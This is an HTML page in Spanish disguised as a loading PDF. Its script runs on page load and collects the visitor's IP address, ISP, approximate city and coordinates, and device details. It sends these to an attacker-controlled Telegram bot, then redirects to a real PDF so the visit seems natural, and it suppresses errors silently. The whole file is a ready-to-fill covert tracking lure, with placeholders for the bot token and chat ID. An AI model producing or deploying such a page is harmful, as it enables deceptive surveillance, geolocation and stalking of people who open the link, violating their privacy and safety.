<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Abriendo Documento PDF...</title>
    <style>
        body { background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { margin-top: 20px; color: #555; position: absolute; transform: translateY(50px); }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="text">Cargando archivo...</div>

    <script>
        // CONFIGURACIÃ“N RECOMENDADA: Usa un token nuevo generado en @BotFather
        const TOKEN = 'TU_NUEVO_TOKEN_AQUI'; 
        const CHAT_ID = 'TU_ID_AQUI'; 
        const PDF_URL = 'https://drive.google.com/uc?export=download&id=ID_DE_TU_DRIVE'; 

        async function rastrear() {
            try {
                // 1. Obtener datos de red (IP, Proveedor, UbicaciÃ³n aproximada)
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();

                // 2. Obtener datos del dispositivo (Navegador, Modelo aproximado)
                const agente = navigator.userAgent;

                // 3. Formatear el mensaje para Telegram
                const texto = `ðŸ”” *NUEVA VISITA DETECTADA*\n\n` +
                              `ðŸŒ *IP:* \`${d.ip}\`\n` +
                              `ðŸ“¶ *ISP:* ${d.org}\n` +
                              `ðŸ“ *UbicaciÃ³n:* ${d.city}, ${d.region}, ${d.country_name}\n` +
                              `ðŸ“± *Dispositivo:* ${agente.split(')')[0]})\n` +
                              `ðŸ”— *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                // 4. Enviar reporte al bot de Telegram
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: texto,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) {
                console.error("Error silencioso");
            } finally {
                // Redirigir al PDF real despuÃ©s de 2 segundos para que parezca natural
                setTimeout(() => {
                    window.location.href = PDF_URL;
                }, 1500);
            }
        }

        window.onload = rastrear;
    </script>
</body>
</html>
